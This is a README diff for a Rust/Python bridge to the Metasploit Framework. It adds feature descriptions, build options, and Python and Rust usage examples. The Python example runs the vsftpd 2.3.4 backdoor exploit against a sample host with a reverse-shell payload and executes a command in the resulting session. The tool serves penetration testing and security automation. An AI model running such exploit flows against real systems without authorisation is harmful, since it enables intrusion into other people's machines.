@@ -10,19 +10,28 @@
 
 ## 📚 **Overview**
 
-**Assassinate** is a high-performance **Rust FFI bridge** that provides Python access to the complete **Metasploit Framework**. Built with **Magnus** and **PyO3**, it delivers native performance while maintaining the flexibility of Python for security automation workflows.
+**Assassinate** is a high-performance **Rust FFI bridge** that provides **Python** (primary) and **Rust** access to the complete **Metasploit Framework**. Built with **Magnus** for Ruby VM embedding and **PyO3** for Python bindings, it delivers native performance while maintaining the flexibility of high-level language interfaces for security automation workflows.
 
-The bridge has been validated with **1,200+ MSF test cases** passing, proving complete parity with native Metasploit functionality.
+The bridge has been validated with **1,214+ MSF test cases** passing (including complex payload encoding), proving complete parity with native Metasploit functionality.
+
+### Use Cases
+
+- **Python Developers** (Primary): Import `assassinate_bridge` in Python for MSF automation with native performance
+- **Rust Developers**: Use the pure Rust API for type-safe, zero-overhead MSF integration in Rust applications
+- **Security Tools**: Embed MSF functionality directly in custom tooling with minimal overhead
 
 ---
 
 ## 🛠️ **Key Features**
 
 - **Complete MSF Parity:** Full access to Metasploit Framework functionality through Rust FFI
+- **Dual Language Support:**
+  - **Python API** (Primary): PyO3 bindings for seamless Python integration
+  - **Pure Rust API**: Optional standalone usage without Python dependencies
 - **Native Performance:** Rust-based implementation with zero-copy operations where possible
-- **Production Ready:** Validated with 1,200+ MSF test cases (99.9% success rate)
+- **Production Ready:** Validated with 1,214+ MSF test cases (99.9% success rate)
 - **Type-Safe:** Rust's type system ensures memory safety and prevents common vulnerabilities
-- **Python Integration:** Clean Python API via PyO3 for easy integration into existing workflows
+- **Flexible Deployment:** Use as Python module or pure Rust library via Cargo features
 - **Comprehensive Testing:** Full test harness running MSF's own test suite through the bridge
 
 ---
@@ -122,6 +131,132 @@ The bridge automatically detects your Ruby installation. For custom Ruby paths:
 export RUBY=/path/to/your/ruby
 cargo build --release
 ```
+
+---
+
+## 📖 **Usage**
+
+### **Python API** (Primary Use Case)
+
+The Python API provides the most straightforward way to use Assassinate:
+
+```python
+import assassinate_bridge
+
+# Initialize Metasploit Framework
+assassinate_bridge.initialize_metasploit("/path/to/metasploit-framework")
+
+# Create framework instance
+framework = assassinate_bridge.Framework()
+
+# Get MSF version
+version = framework.version()
+print(f"Metasploit Framework version: {version}")
+
+# List available exploits
+exploits = framework.list_modules("exploits")
+print(f"Available exploits: {len(exploits)}")
+
+# Create and configure a module
+module = framework.create_module("exploit/unix/ftp/vsftpd_234_backdoor")
+module.set_option("RHOSTS", "192.168.1.100")
+module.set_option("RPORT", "21")
+
+# Validate configuration
+if module.validate():
+    # Run the exploit
+    session_id = module.exploit("payload/cmd/unix/reverse")
+    if session_id:
+        print(f"Exploit successful! Session ID: {session_id}")
+
+        # Get session manager
+        sessions = framework.sessions()
+        session = sessions.get(session_id)
+
+        if session and session.alive():
+            # Execute commands
+            output = session.execute("whoami")
+            print(f"Command output: {output}")
+```
+
+### **Rust API** (Optional)
+
+For Rust developers, the library can be used without Python dependencies:
+
+#### **Add to `Cargo.toml`:**
+
+```toml
+[dependencies]
+# Without Python bindings (pure Rust)
+assassinate_bridge = { version = "0.1", default-features = false }
+
+# Or with Python bindings (default)
+# assassinate_bridge = "0.1"
+```
+
+#### **Rust Usage Example:**
+
+```rust
+use assassinate_bridge::{Framework, init_metasploit};
+use std::error::Error;
+
+fn main() -> Result<(), Box<dyn Error>> {
+    // Initialize Metasploit Framework
+    init_metasploit("/path/to/metasploit-framework")?;
+
+    // Create framework instance
+    let framework = Framework::new(None)?;
+
+    // Get MSF version
+    let version = framework.version()?;
+    println!("Metasploit Framework version: {}", version);
+
+    // List available exploits
+    let exploits = framework.list_modules("exploits")?;
+    println!("Available exploits: {}", exploits.len());
+
+    // Create and configure a module
+    let module = framework.create_module("exploit/unix/ftp/vsftpd_234_backdoor")?;
+    module.set_option("RHOSTS", "192.168.1.100")?;
+    module.set_option("RPORT", "21")?;
+
+    // Validate and run
+    if module.validate()? {
+        println!("Module configuration valid!");
+        // Execute exploit...
+    }
+
+    Ok(())
+}
+```
+
+#### **Build Configurations:**
+
+```bash
+# Build with Python bindings (default)
+cargo build --release
+
+# Build without Python bindings (pure Rust)
+cargo build --release --no-default-features
+
+# Run tests without Python
+cargo test --no-default-features --lib
+```
+
+### **API Reference**
+
+Both Python and Rust APIs provide access to:
+
+- **Framework Management**: Initialize, configure, and version info
+- **Module Operations**: List, create, and configure exploits/auxiliary/payloads
+- **DataStore**: Key-value configuration storage (case-insensitive)
+- **Session Management**: Interact with established sessions
+- **Payload Generation**: Create and encode payloads in various formats
+- **Exploit Execution**: Run exploits and capture sessions
+
+For complete API documentation:
+- **Python**: Use `help(assassinate_bridge)` after importing
+- **Rust**: Run `cargo doc --open` in the `assassinate_bridge` directory
 
 ---
 
